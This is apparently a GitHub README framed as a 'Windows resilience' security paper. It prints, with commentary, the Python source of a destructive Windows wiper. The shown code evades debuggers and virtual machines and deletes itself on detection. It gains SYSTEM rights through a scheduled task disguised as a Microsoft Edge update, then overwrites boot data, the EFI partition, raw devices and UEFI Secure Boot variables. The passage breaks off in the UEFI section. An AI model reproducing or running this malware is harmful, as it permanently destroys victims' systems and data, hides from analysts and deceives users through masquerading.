# 🔬 windows-resilience-research 


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    SECURITY RESEARCH PAPER                        ║
║             Windows System Resilience Analysis                    ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Windows-blue?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Security%20Research-red)]()

**Author:** Vladislav Khudash (17)  
**Date:** 05.04.2026  
**Project:** WINDOWS-RESILIENCE-RESEARCH

</div>

---

## ⚠️ CRITICAL RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **🔬 Purpose** | Security research on Windows system resilience and recovery mechanisms |
| **🧪 Environment** | **ISOLATED VIRTUAL MACHINES ONLY** — Never run on production systems |
| **⚖️ Legal** | This research demonstrates attack vectors for defensive purposes only |
| **💀 Warning** | This code will **PERMANENTLY DESTROY** the target system |
| **📚 Educational** | Understanding these techniques is essential for building robust defenses |

</div>

---

## 📖 Table of Contents

| Section | Description |
|---------|-------------|
| [1. Configuration](#1-configuration-section) | Configuration flags and validation |
| [2. Anti-Analysis](#2-anti-analysis-section) | Anti-debug, VM detection, self-destruction |
| [3. Imports and Initialization](#3-imports-and-initialization) | Module imports and global variables |
| [4. Utility Functions](#4-utility-functions) | is_bios(), getenc(), get_volumes(), mount(), umount() |
| [5. Registry Functions](#5-registry-functions) | reg_unload(), reg_del() |
| [6. Threaded Map](#6-threaded-map) | tmap() |
| [7. Command Execution](#7-command-execution) | cmd() |
| [8. Device Write](#8-device-write) | write_dev() |
| [9. Privilege Escalation](#9-privilege-escalation) | get_admin(), get_SYSTEM() |
| [10. EFI Privileges](#10-efi-privileges) | get_efi_privileges() |
| [11. Filesystem Operations](#11-filesystem-operations) | S_ISREG(), S_ISLNK(), attr(), remove_file() |
| [12. Directory Operations](#12-directory-operations) | iter_dir(), remove_dir() |
| [13. EFI Variable Wipe](#13-efi-variable-wipe) | wipe_efivar() |
| [14. BCD Destruction](#14-bcd-destruction) | BCD() |
| [15. ESP Destruction](#15-esp-destruction) | ESP() |
| [16. UEFI/BIOS Destruction](#16-uefibios-destruction) | UEFI(), BIOS() |
| [17. Device Destruction](#17-device-destruction) | DEVICE() |
| [18. Windows Destruction](#18-windows-destruction) | WINDOWS() |
| [19. RAM Exhaustion](#19-ram-exhaustion) | RAM() |
| [20. BSOD Trigger](#20-bsod-trigger) | BSOD() |
| [21. Signal Initialization](#21-signal-initialization) | siginit() |
| [22. Process Initialization](#22-process-initialization) | init_proc() |
| [23. Input Blocking](#23-input-blocking) | BlockInput() |
| [24. Main Execution Flow](#24-main-execution-flow) | _start(), main() |
| [25. Defense Recommendations](#25-defense-recommendations) | Protection measures |

---

# English

## 1. Configuration Section

<details>
<summary><b>📁 Click to expand: Configuration Flags and Validation</b></summary>

```python
#===================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 05.04.2026
#     PROJECT  : WINDOWS-RESILIENCE-RESEARCH
#     PLATFORM : WIN32
#===================================#

#SECTION CONFIG

# [ PRIVILEGE STRATEGY ]
# True : Force admin access by retrying indefinitely until success
FORCE_ADMIN_ACCESS:bool=False

# [ ANTI-DEBUG ]
# True : Detect and self-destruct if ptrace, gdb, or any tracer is attached
ENABLE_ANTIDEBUG:bool=False

# [ SANDBOX CONTROL ]
# True : Self-destruct if running in a Virtual Machine or Sandbox environment
BLOCK_SANDBOX:bool=False

# [ STEALTH STRATEGY ]
# True : Overwrite and delete this file immediately upon any detection
STRICT_SELF_DESTRUCT:bool=False

#END CONFIG

if not isinstance(FORCE_ADMIN_ACCESS, bool):
    raise SystemExit('(FORCE_ADMIN_ACCESS) must be (bool)')

if not isinstance(ENABLE_ANTIDEBUG, bool):
    raise SystemExit('(ENABLE_ANTIDEBUG) must be (bool)')

if not isinstance(BLOCK_SANDBOX, bool):
    raise SystemExit('(BLOCK_SANDBOX) must be (bool)')

if not isinstance(STRICT_SELF_DESTRUCT, bool):
    raise SystemExit('(STRICT_SELF_DESTRUCT) must be (bool)')

__init=type('main', (Exception,), {
        '__slots__' : ('_',),
        '__init__'  : lambda s, f: (
            s.__setattr__('_', f), 
            Exception.__init__(s)
        )[1]
    }
)
main=0
def main():raise(SystemExit(0))
__=1;globals()['__']=NotImplemented
___=2;globals()['___']=ENABLE_ANTIDEBUG
____=3;globals()['____']=BLOCK_SANDBOX
```

**Analysis:**

| Flag | Default | Purpose |
|------|---------|---------|
| `FORCE_ADMIN_ACCESS` | `False` | Retry UAC bypass until success |
| `ENABLE_ANTIDEBUG` | `False` | Detect and evade debuggers |
| `BLOCK_SANDBOX` | `False` | Detect VM/sandbox environments |
| `STRICT_SELF_DESTRUCT` | `False` | Securely delete self on detection |

The obfuscated `__init` class and `__`, `___`, `____` variables serve as **tamper detection** — if modified, the program will detect the change and self-destruct.

</details>

---

## 2. Anti-Analysis Section

<details>
<summary><b>📁 Click to expand: Anti-Debug, VM Detection, and Self-Destruction</b></summary>

### 2.1 Imports and Setup

```python
#SECTION ANTI-ANALYSIS

import sys
sys.dont_write_bytecode=True
import os

if sys.platform != 'win32':
    try:
        sys.stderr.write(f'DO NOT SUPPORT OS ({sys.platform})')
    finally:
        os._exit(0)

getattr(sys, 'setswitchinterval', lambda _: None)(0.03)

import ctypes  as capi
from   ctypes.wintypes import (
           BYTE,
    CHAR,       PWCHAR,
    BOOLEAN,    HANDLE,
    HKEY,       DWORD,
    ULONG,      ULARGE_INTEGER
)
from time import sleep, perf_counter

mem      = memoryview
cstruct  = capi.Structure
cref     = capi.byref

_argv    = sys.argv
_si      = sys.intern
memset   = capi.memset
_urandom = os.urandom
_join    = os.path.join
_isexst  = os.path.exists
windll   = capi.windll
ntdll    = windll.ntdll
advapi32 = windll.advapi32
kernel32 = windll.kernel32
_exit    = os._exit

_thread  = kernel32.GetCurrentThread()
_proc    = kernel32.GetCurrentProcess()
_cpus    = os.cpu_count() or 3

__file__ = os.path.realpath(_argv[ 0 ])

try:
    with open(__file__, 'rb', buffering=0) as i:
        i.seek(0)
        IS_EXE = i.read(2) == b'MZ'
except OSError:
        IS_EXE = False

SYSTEMDISK = os.getenv('SYSTEMDRIVE', 'C:\\')

if not SYSTEMDISK.endswith('\\'):
    SYSTEMDISK += '\\'

SYSTEMDISK = _si(SYSTEMDISK)
SYSTEM32   = _join(os.getenv('WINDIR', 'Windows'), 'System32')

FLAG_SYSTEM = _si('-s')
```

### 2.2 __die() — Self-Destruction

```python
def __die(_=True):
    _ and not STRICT_SELF_DESTRUCT and _exit(0)
    
    try: 
        sz  = os.path.getsize(__file__)
        tmp = f'{__file__}.{_urandom(8).hex()}'

        try:
            os.rename(__file__, tmp)
        except OSError:
            tmp = __file__

        with open(tmp, 'rb+', buffering=0) as i:
            i.seek(0)
            i.write(mem(_urandom(sz)))
            os.fsync(i.fileno())

        os.remove(tmp)

    except OSError: 
        try:
            os.remove(__file__)
        except OSError:
            pass

    finally:
        _ and _exit(0)
```

**Secure Deletion Process:**
1. Get file size
2. Rename to random hex name (hides original filename)
3. Overwrite entire file with random data
4. `fsync()` to ensure data is physically written
5. Delete the file
6. Fallback to direct removal if rename/overwrite fails

### 2.3 __antidebug() — Debugger Detection

```python
def __antidebug():
    _ = perf_counter()

    kernel32.CreateMutexW(None, True, 'Global\\__TrustedInstaller_Shared')

    if kernel32.GetLastError() == 0xB7:  # ERROR_ALREADY_EXISTS
        __die()

    if (__name__ != '__main__') and (FLAG_SYSTEM not in _argv):
        __die()

    if sys.gettrace() is not None:
        __die()

    if kernel32.IsDebuggerPresent():
        __die()

    db = BOOLEAN()

    if kernel32.CheckRemoteDebuggerPresent(_proc, cref(db)) and db.value:
        __die()

    if (perf_counter() - _) > 0.3: 
        __die()

    globals()['__']=...
```

**Detection Layers:**

| Layer | Method | Target |
|-------|--------|--------|
| 1 | `CreateMutexW` | Multiple instances (debugger restart) |
| 2 | Execution context | Running as imported module |
| 3 | `sys.gettrace()` | Python debugger (pdb, IDE) |
| 4 | `IsDebuggerPresent` | User-mode debuggers (x64dbg, OllyDbg) |
| 5 | `CheckRemoteDebuggerPresent` | Remote debugging sessions |
| 6 | Timing analysis | >300ms overhead = debugger |

### 2.4 __block_sandbox() — VM/Sandbox Detection

```python
def __block_sandbox():

    def _ramsz():
        MEMINFO = type('', (cstruct,), {
            '_fields_': [
                    ('dwLength',                DWORD         ),
                    ('dwMemoryLoad',            DWORD         ),
                    ('ullTotalPhys',            ULARGE_INTEGER),
                    ('ullAvailPhys',            ULARGE_INTEGER),
                    ('ullTotalPageFile',        ULARGE_INTEGER),
                    ('ullAvailPageFile',        ULARGE_INTEGER),
                    ('ullTotalVirtual',         ULARGE_INTEGER),
                    ('ullAvailVirtual',         ULARGE_INTEGER),
                    ('ullAvailExtendedVirtual', ULARGE_INTEGER)
                ]
            }
        )

        mem = MEMINFO()
        mem.dwLength = capi.sizeof(mem)

        if kernel32.GlobalMemoryStatusEx(cref(mem)):
            return mem.ullTotalPhys >> 30  # GB

        return 0
        
    def _mac():
        cpointer = capi.POINTER
        iphlpapi = windll.iphlpapi

        ADAPTER_INFO = type('', (cstruct,), {})
        ADAPTER_INFO._fields_ = [
            ('Next',          cpointer(ADAPTER_INFO) ),
            ('ComboIndex',    DWORD                  ),
            ('AdapterName',   CHAR  * 260            ),
            ('Description',   CHAR  * 132            ),
            ('AddressLength', ULONG                  ),
            ('Address',       BYTE  * 8              )
        ]
        
        sz = ULONG(0)
        iphlpapi.GetAdaptersInfo(None, cref(sz))
        
        if sz.value == 0:
            return False
        
        buf = (BYTE * sz.value)()
        
        if iphlpapi.GetAdaptersInfo(cref(buf), cref(sz)) != 0:
            return False
        
        ptr = capi.cast(buf, cpointer(ADAPTER_INFO))
        
        null = mem(b'\x00\x00\x00\x00\x00\x00')
        vmid = frozenset((
            mem(b'\x08\x00\x27'),    # VirtualBox
            mem(b'\x00\x0c\x29'),    # VMware
            mem(b'\x00\x05\x69'),    # VMware
            mem(b'\x00\x1c\x14'),    # VMware
            mem(b'\x00\x15\x5d'),    # Hyper-V
            mem(b'\x52\x54\x00'),    # QEMU
            mem(b'\x00\x1c\x42'),    # Parallels
            mem(b'\x00\x16\x3e'),    # Xen
            mem(b'\x00\x50\x56')     # VMware
        ))
        
        while ptr:
            lnm = ptr.contents.AddressLength
            mac = mem(bytes(ptr.contents.Address[ 0 : lnm ]))
            
            if lnm < 6:
                ptr = ptr.contents.Next
                continue
            
            if (
                (mac[ 0 ]     &  0x02) or      # Locally administered
                (mac[ 0 : 3 ] in vmid) or      # Known VM OUI
                (mac          == null)         # All zeros
            ):
                return True

            ptr = ptr.contents.Next
        
        return False
    
    def _smbios():
        RSMB = 0x52534D42
        gsft = kernel32.GetSystemFirmwareTable

        sz = gsft(RSMB, 0, None, 0)

        if sz == 0:
            return False
        
        buf = (BYTE * sz)()
        
        if gsft(RSMB, 0, buf, sz) != sz:
            return False
        
        idx = mem(bytes(buf).lower())
        
        return any(vm in idx for vm in (
            mem(b'vmware'),             mem(b'virtualbox'),    mem(b'qemu'),
            mem(b'kvm'),                mem(b'xen'),           mem(b'parallels'),
            mem(b'virtual machine'),    mem(b'innotek'),       mem(b'seabios'),
                        mem(b'bochs'),              mem(b'bhyve')
        ))

    # Driver-based detection
    dsys = _join(SYSTEM32, 'drivers')

    if any(_isexst(_join(dsys, p)) for p in (
        'VBoxGuest.sys',    'VBoxMouse.sys',     'VBoxVideo.sys', 
                            'VBoxSF.sys',
        'vmhgfs.sys',       'vmmouse.sys',       'vmmemctl.sys', 
        'vm3dmp.sys',       'vmxnet.sys',        'vmci.sys',
        'vioscsi.sys',      'virtio_blk.sys',    'virtio_net.sys',
        'vms3mp.sys',       'vmbus.sys',         'vmsp.sys',
        'prleth.sys',       'prlfs.sys',         'prlmouse.sys'
    )):
        __die()

    # Disk size check (< 100GB = VM)
    total = ULARGE_INTEGER()

    if not kernel32.GetDiskFreeSpaceExW(SYSTEMDISK, None, cref(total), None):
        __die()

    if (total.value >> 30) < 100:
        __die()

    # CPU count (< 4 = VM)
    if _cpus < 4:
        __die()

    # RAM size (< 4GB = VM)
    if _ramsz() < 4:
        __die()

    # MAC address detection
    if _mac():
        __die()

    # SMBIOS detection
    if _smbios():
        __die()
    
    globals()['__']=...
```

**VM Detection Matrix:**

| Check | Physical System | Virtual Machine |
|-------|-----------------|-----------------|
| VMware drivers | Absent | `vmhgfs.sys`, `vmmouse.sys` |
| VirtualBox drivers | Absent | `VBoxGuest.sys`, `VBoxMouse.sys` |
| VirtIO drivers | Absent | `vioscsi.sys`, `virtio_net.sys` |
| MAC OUI | Hardware vendor | `08:00:27` (VBox), `00:0C:29` (VMware) |
| SMBIOS strings | Dell/Lenovo/HP | "VMware", "VirtualBox", "QEMU" |
| Disk size | ≥256GB | <100GB |
| CPU cores | ≥4 | 1-2 |
| RAM size | ≥8GB | <4GB |

### 2.5 Anti-Analysis Execution

```python
if ENABLE_ANTIDEBUG:
    try:
        __antidebug()
    except:
        __die()

if BLOCK_SANDBOX:
    try:
        __block_sandbox()
    except:
        __die()

#END ANTI-ANALYSIS
```

</details>

---

## 3. Imports and Initialization

<details>
<summary><b>📁 Click to expand: Module Imports and Global Variables</b></summary>

```python
import gc       as _gc
import signal   as sig

from concurrent.futures import ThreadPoolExecutor as Tpool,     ProcessPoolExecutor as Ppool
from winreg             import HKEY_LOCAL_MACHINE,              HKEY_USERS
from subprocess         import run                as sp_run,    DEVNULL
from warnings           import filterwarnings     as _off_warn
from logging            import disable            as _off_log
from locale             import getencoding
from io                 import StringIO
from collections        import deque

_1mb   = 1_048_576
_4mb   = 4_194_304
_s_fm  = 0o170000  
_chars = _si('ABCDEFGHIJKLMNOPQRSTUVWXYZ')

PYEXE = os.path.realpath(sys.executable)

POOL_WORKERS = _cpus << 1
POOL_TIMEOUT = 3 
POOL         = Tpool(POOL_WORKERS)

URANDOM = mem(bytearray(_urandom(_4mb)))
```

**Constants:**

| Constant | Value | Purpose |
|----------|-------|---------|
| `_1mb` | 1,048,576 | Buffer size for file overwrite |
| `_4mb` | 4,194,304 | Buffer size for block devices |
| `_s_fm` | `0o170000` | File type mask from `st_mode` |
| `_chars` | 'A'..'Z' | Drive letters for enumeration |
| `POOL_WORKERS` | `_cpus * 2` | Thread pool size |
| `URANDOM` | 4MB | Pre-allocated random data buffer |

</details>

---

## 4. Utility Functions

<details>
<summary><b>📁 Click to expand: is_bios(), getenc(), get_volumes(), mount(), umount()</b></summary>

### 4.1 is_bios() — Detect BIOS vs UEFI

```python
def is_bios():
    fw = DWORD()
    kernel32.GetFirmwareType(cref(fw))
    return fw.value == 1
```

**Return values:**
- `1` = BIOS
- `2` = UEFI
- `3` = Unknown

### 4.2 getenc() — Get Console Encoding

```python
def getenc():
    cp = f'cp{kernel32.GetConsoleOutputCP()}'
    try:
        'CPython'.encode(cp)
        return cp
    except (UnicodeEncodeError, LookupError):
        return getencoding()
```

### 4.3 get_volumes() — Enumerate Volumes

```python
def get_volumes(
    _t = capi.create_unicode_buffer,
    _f = kernel32.FindFirstVolumeW, 
    _n = kernel32.FindNextVolumeW, 
    _c = kernel32.FindVolumeClose,
    _e = HANDLE(-1).value
):
    _f.restype  =  HANDLE
    _n.argtypes = [HANDLE, PWCHAR, ULONG]
    _c.argtypes = [HANDLE]

    b = _t(512)
    l = len(b)
    h = _f(b, l)
    
    if h == _e:
        return
    
    try:
        while True:
            yield b.value
            if not _n(h, b, l): 
                break
    finally:
        _c(h)
```

### 4.4 mount() / umount() — Volume Mount Operations

```python
def mount(d, g, _f=kernel32.SetVolumeMountPointW):
    return _f(d, g) != 0

def umount(d, _f=kernel32.DeleteVolumeMountPointW):
    return _f(d) != 0
```

</details>

---

## 5. Registry Functions

<details>
<summary><b>📁 Click to expand: reg_unload(), reg_del()</b></summary>

### 5.1 reg_unload() — Unload Registry Hive

```python
def reg_unload(h, k, _f=advapi32.RegUnLoadKeyW):
    return _f(HKEY(h), k) == 0
```

### 5.2 reg_del() — Delete Registry Key Tree

```python
def reg_del(h, k, _f=advapi32.RegDeleteTreeW):
    return _f(HKEY(h), k) == 0
```

</details>

---

## 6. Threaded Map

<details>
<summary><b>📁 Click to expand: tmap()</b></summary>

### 6.1 tmap() — Threaded Map with Timeout

```python
def tmap(
    func, 
    itr, 
    _ir = iter,
    _nx = next,
    _rg = range,
    _dq = deque,
    _sb = POOL.submit, 
    _tm = POOL_TIMEOUT, 
    _ck = POOL_WORKERS,
    _si = StopIteration,
    _ex = Exception
):
    itr = _ir(itr)

    dq = _dq()
    da = dq.append
    dp = dq.popleft

    for _ in _rg(_ck):
        try:
            da(_sb(func, _nx(itr)))
        except _si:
            break
 
    while dq:
        t = dp()

        try:
            yield t.result(_tm)
        except _ex:
            pass 
            
        try:
            da(_sb(func, _nx(itr)))
        except _si:
            continue
```

</details>

---

## 7. Command Execution

<details>
<summary><b>📁 Click to expand: cmd()</b></summary>

### 7.1 cmd() — Execute Command with Optional Output

```python
def cmd(c, out=False, _en=getenc(), _sp=sp_run):
    try:
        if out:
            return _sp(
                c, 
                capture_output = True, 
                text           = True,
                encoding       = _en,
                errors         = 'replace',
                timeout        = 3
            )

        return _sp(
            c, 
            stdin              = DEVNULL,
            stdout             = DEVNULL, 
            stderr             = DEVNULL, 
            timeout            = 3
        ).returncode
    
    except Exception:
        return None if out else -1
```

</details>

---

## 8. Device Write

<details>
<summary><b>📁 Click to expand: write_dev()</b></summary>

### 8.1 write_dev() — Write Random Data to Device

```python
def write_dev(
    dev, 
    sz, 
    _cs = _4mb,
    _ur = (CHAR * len(URANDOM)).from_buffer(URANDOM), 
    _dw = DWORD,
    _mn = min,
    _op = kernel32.CreateFileW,
    _wt = kernel32.WriteFile,
    _cl = kernel32.CloseHandle,
    _fs = kernel32.FlushFileBuffers,
    _er = HANDLE(-1).value
):
    hd = _op(dev, 0xc0000000, 0x3, None, 3, 0x80, None)
        
    if hd == _er:
        return False
    
    wtr = _dw()
    wtl = 0

    while wtl < sz:
        ck = _mn(_cs, sz - wtl)

        ok = _wt(hd, _ur, ck, cref(wtr), None)
        wb = wtr.value

        if not ok or (wb == 0):
            break

        wtl += wb

    _fs(hd)
    _cl(hd)

    return wtl > 0
```

**Parameters:**
- `0xc0000000` = `GENERIC_READ | GENERIC_WRITE`
- `0x3` = `FILE_SHARE_READ | FILE_SHARE_WRITE`
- `3` = `OPEN_EXISTING`
- `0x80` = `FILE_ATTRIBUTE_NORMAL`

</details>

---

## 9. Privilege Escalation

<details>
<summary><b>📁 Click to expand: get_admin(), get_SYSTEM()</b></summary>

### 9.1 get_admin() — UAC Bypass to Administrator

```python
def get_admin():
    shell32 = windll.shell32

    if (shell32.IsUserAnAdmin() != 0) or (FLAG_SYSTEM in _argv):
        return
    
    if IS_EXE:
        exe = __file__
        arg = None
    else:
        exe = PYEXE
        arg = __file__
    
    q = shell32.ShellExecuteW

    if FORCE_ADMIN_ACCESS:
        while q(None, 'runas', exe, arg, None, 0) <= 32:
            pass
    else:
        q(None, 'runas', exe, arg, None, 0)

    _exit(0)
```

**ShellExecute return values:**
- `> 32` = Success
- `<= 32` = Error (access denied, canceled, etc.)

### 9.2 get_SYSTEM() — Elevate to SYSTEM via Task Scheduler

```python
def get_SYSTEM():
    if FLAG_SYSTEM in _argv:
        return
    
    uid  = f'{_urandom(4).hex()}-{_urandom(2).hex()}-{_urandom(2).hex()}-{_urandom(2).hex()}-{_urandom(6).hex()}'.upper()
    task = f'MicrosoftEdgeUpdateTaskMachineCore{{{ uid }}}'
    dec  = (
        'Keeps your Microsoft software up to date. '
        'If this task is disabled or stopped, '
        'your Microsoft software will not be kept up to date.'
    )

    if IS_EXE:
        exe = __file__
        arg = FLAG_SYSTEM
    else:
        exe = PYEXE
        arg = f'{__file__} {FLAG_SYSTEM}'

    b1 = _si('"')
    b2 = _si('""')
    
    if b1 in dec:
        dec = dec.replace(b1, b2)
    if b1 in exe:
        exe = exe.replace(b1, b2)
    if b1 in arg:
        arg = arg.replace(b1, b2)
    
    c = (
        f'$t = New-ScheduledTaskAction -Execute "{exe}" -Argument "{arg}"; '
        
        f'$e = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries '
        f'-StartWhenAvailable -DisallowDemandStart:$false -Priority 4; '
        f'$e.AllowHardTerminate = $false; '
        
        f'$p = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Service -RunLevel Highest; '
        f'Register-ScheduledTask -TaskName "{task}" -Action $t -Settings $e -Principal $p '
        f'-Description "{dec}" -Force; '
        
        f'Start-ScheduledTask -TaskName "{task}"'
    )

    ok = cmd(('powershell', '-WindowStyle', 'Hidden', '-Command', c)) == 0

    if ok:
        _exit(0)
```

**SYSTEM Elevation Chain:**
1. Generate random GUID for task name (masquerades as Microsoft Edge update)
2. Create scheduled task with `UserId="SYSTEM"`, `RunLevel=Highest`
3. Configure task to run immediately on creation
4. Execute via PowerShell
5. Current process exits, new process runs as SYSTEM

</details>

---

## 10. EFI Privileges

<details>
<summary><b>📁 Click to expand: get_efi_privileges()</b></summary>

### 10.1 get_efi_privileges() — Enable SeSystemEnvironmentPrivilege

```python
def get_efi_privileges():
    TOKEN_QUERY                = 0x0008
    TOKEN_ADJUST_PRIVILEGES    = 0x0020
    SE_PRIVILEGE_ENABLED       = 0x00000002
    SE_SYSTEM_ENVIRONMENT_NAME = 'SeSystemEnvironmentPrivilege'
    
    LUID = type('', (cstruct,), {
        '_fields_': [
                ('LowPart',  DWORD), 
                ('HighPart', DWORD)
            ]
        }
    )

    ATTR = type('', (cstruct,), {
        '_fields_': [
                ('Luid',       LUID ), 
                ('Attributes', DWORD)
            ]
        }
    )

    TOKEN = type('', (cstruct,), {
        '_fields_': [
                ('PrivilegeCount', DWORD   ), 
                ('Privileges',     ATTR * 1)
            ]
        }
    )
    
    hToken = HANDLE()

    if not advapi32.OpenProcessToken(
        _proc,
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        cref(hToken)
    ):
        return False
    
    luid = LUID()

    if not advapi32.LookupPrivilegeValueW(
        None,
        SE_SYSTEM_ENVIRONMENT_NAME,
        cref(luid)
    ):
        kernel32.CloseHandle(hToken)
        return False
    
    tp                            = TOKEN()
    tp.PrivilegeCount             = 1
    tp.Privileges[ 0 ].Luid       = luid
    tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED
    
    if not advapi32.AdjustTokenPrivileges(
        hToken,
        False,
        cref(tp),
        0,
        None,
        None
    ):
        kernel32.CloseHandle(hToken)
        return False
    
    err = kernel32.GetLastError()
    kernel32.CloseHandle(hToken)
    
    return err in (0, 1300)
```

**Required for:** Modifying UEFI variables via `SetFirmwareEnvironmentVariableW`

</details>

---

## 11. Filesystem Operations

<details>
<summary><b>📁 Click to expand: S_ISREG(), S_ISLNK(), attr(), remove_file()</b></summary>

### 11.1 File Type Detection

```python
def S_ISREG(m, _e=0o100000, _f=_s_fm): 
    return (m & _f) == _e

def S_ISLNK(m, _e=0o120000, _f=_s_fm): 
    return (m & _f) == _e
```

### 11.2 attr() — Remove Security Attributes

```python
def attr(p, _f=advapi32.SetNamedSecurityInfoW, _h=os.chmod, _e=OSError):    
    _f(p, 1, 1, None, None, None, None)  # Owner
    _f(p, 1, 4, None, None, None, None)  # Group
    try:
        _h(p, 0o200)  # Write-only
    except _e:
        pass
```

### 11.3 remove_file() — Secure File Deletion

```python
def remove_file(
    p, 
    _lm = _1mb, 
    _ur = URANDOM[ 0 : _1mb ],
    _ie = isinstance,
    _de = os.DirEntry,
    _ls = os.lstat,
    _il = S_ISLNK,
    _ir = S_ISREG,
    _at = attr,
    _op = open,
    _ex = OSError
):
    try:
        if _ie(p, _de):
            st = p.stat()
            p  = p.path
        else:
            st = _ls(p) 
            if _il(st.st_mode):
                return False

        if not _ir(st.st_mode):
            return False

        sz = st.st_size

    except _ex:
        return False

    if sz == 0:
        return True
    elif sz > _lm:
        sz = _lm
    
    try:
        _at(p)
        with _op(p, 'rb+', buffering=0) as f:
            f.write(_ur[ 0 : sz ])
        return True
    except _ex:
        return False
```

</details>

---

## 12. Directory Operations

<details>
<summary><b>📁 Click to expand: iter_dir(), remove_dir()</b></summary>

### 12.1 iter_dir() — Recursive Directory Iterator

```python
def iter_dir(
    p,
    _q = deque,
    _s = os.scandir,
    _i = type(
            '', (),
            {
                '__slots__' : ( 'path', ),
                '__init__'  : lambda t, w : t.__setattr__('path', w)
            }
    ),
    _x = OSError
):
    c = _q(( _i(p), ))

    u = c.appendleft
    g = c.pop

    while c:
        try:
            f = _s(g().path)

            try:
                for e in f:
                    if e.is_dir(follow_symlinks=False):
                        u(e)
                        continue
                    else:
                        yield e
            finally:
                f.close()
        except _x:
            continue
```

### 12.2 remove_dir() — Recursive Directory Deletion

```python
def remove_dir(
    p, 
    _dq = deque,
    _mp = tmap,
    _it = iter_dir,
    _rm = remove_file
):
    _dq(_mp(_rm, _it(p)), maxlen=0)
```

</details>

---

## 13. EFI Variable Wipe

<details>
<summary><b>📁 Click to expand: wipe_efivar()</b></summary>

### 13.1 wipe_efivar() — Corrupt EFI Variable

```python
def wipe_efivar(
    v, 
    g, 
    _a = abs,
    _l = len,
    _h = hash,
    _u = URANDOM,
    _m = len(URANDOM) - 16, 
    _f = kernel32.SetFirmwareEnvironmentVariableW, 
    _e = Exception
):
    try:
        i  = ( _a( _h(v) ) ^ _a( _h(g) ) ) % _m
        dt = _u[ i : i + 16 ].tobytes()

        if _f(v, g, dt, _l(dt)):
            return True
            
        if _f(v, g, None, 0):
            return True
        
    except _e:
        pass
        
    return False
```

**Strategy:**
1. Generate deterministic offset from variable name + GUID hash
2. Try to write 16 bytes of random data
3. Fallback: try to delete the variable (`None` value)

</details>

---

## 14. BCD Destruction

<details>
<summary><b>📁 Click to expand: BCD()</b></summary>

### 14.1 BCD() — Destroy Boot Configuration Data

```python
def BCD():
    EDIT = _si('bcdedit')

    records = {
        '{bootmgr}',    '{fwbootmgr}',    
        '{current}',    '{default}',    
                '{memdiag}'
    }

    lb = _si('--------')
    bs = _si('{')
    be = _si('}')
    cf = False
    au = records.add

    benum = cmd((EDIT, '/enum', 'all'), out=True)

    if benum is None:
        return

    with StringIO(benum.stdout) as buf:
        for l in buf:
            if cf:
                start = l.find( bs)
                end   = l.rfind(be)

                if (start != -1) and (end != -1):
                    au(l[ start : end + 1 ])
                    cf = False
                    continue
            elif l.startswith(lb):
                cf = True

    cmd((EDIT, '/set', '{bootmgr}',   'displayorder', _urandom(8).hex()))
    cmd((EDIT, '/set', '{fwbootmgr}', 'displayorder', _urandom(8).hex()))

    for r in records:
        cmd((EDIT, '/delete', r, '/f'))

    reg_unload(HKEY_LOCAL_MACHINE, 'BCD00000000')
    reg_del(   HKEY_LOCAL_MACHINE, 'BCD00000000')

    for p in (
        _join(SYSTEMDISK, 'Boot', 'BCD'                    ),
        _join(SYSTEM32,   'Boot', 'BCD'                    ),
        _join(SYSTEM32,   'config', 'BCD'                  ),
        _join(SYSTEMDISK, 'EFI', 'Boot', 'BCD'             ),
        _join(SYSTEMDISK, 'EFI', 'Microsoft', 'Boot', 'BCD'),
        _join(SYSTEM32,   'BCD-Template'                   ),
        _join(SYSTEM32,   'config', 'BCD-Template'         )
    ):
        remove_file(p)
```

**BCD Destruction Chain:**
1. Enumerate all BCD entries via `bcdedit /enum all`
2. Corrupt display order with random GUIDs
3. Delete core BCD entries: `{bootmgr}`, `{fwbootmgr}`, `{current}`, `{default}`, `{memdiag}`
4. Unload and delete registry hive `BCD00000000`
5. Overwrite all BCD file locations

</details>

---

## 15. ESP Destruction

<details>
<summary><b>📁 Click to expand: ESP()</b></summary>

### 15.1 ESP() — Destroy EFI System Partition

```python
def ESP():
    for c in _chars:
        if _isexst(f'{c}:\\'):
            continue

        tom  = _si(f'{c}:')
        disk = _si(f'{tom}\\')
        break
    else:
        return
    
    for vol in get_volumes():
        if not mount(disk, vol):
            continue

        if not (
            _isexst(_join(disk, 'Boot')) or 
            _isexst(_join(disk, 'EFI' ))
        ):
            umount(disk)
            continue

        ok = write_dev(f'\\\\.\\{tom}', _4mb)

        if not ok:
            remove_dir(disk)
        
        umount(disk)
```

**ESP Destruction Strategy:**
1. Find an unused drive letter
2. Enumerate all volumes
3. Mount each volume to the drive letter
4. Check if it contains `Boot` or `EFI` directories (ESP indicators)
5. Attempt direct device write to `\\.\X:`
6. Fallback: recursively delete all files on the partition

</details>

---

## 16. UEFI/BIOS Destruction

<details>
<summary><b>📁 Click to expand: UEFI(), BIOS()</b></summary>

### 16.1 UEFI() — UEFI Firmware Destruction

```python
def UEFI():
    if not get_efi_privileges():
        return
    
    GLOB = '{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}'
    MS   = '{77FA9ABD-0359-4D32-BD60-28F4E78F784B}'  

    for var in (
        'BootOrder',     'BootNext',     'Timeout',
        'Boot0000',      'Boot0001',     'Boot0002', 
        'Boot0003',      'Boot0004',     'Boot0005',       
        'SecureBoot',    'SetupMode',    'PlatformLang',
        'PK',            'KEK',          'db',           
                         'dbx',
        'ConIn',         'ConOut',       'ErrOut',       
            'KeySupport',    'OsIndications'
    ):
        wipe_efivar(var, GLOB)  
        wipe_efivar(var, MS  )
```

**UEFI Variables Destroyed:**

| Variable | Purpose |
|----------|---------|
| `BootOrder` | Boot entry order |
| `BootNext` | One-time boot override |
| `Timeout` | Boot menu timeout |
| `Boot0000-0005` | Boot entries |
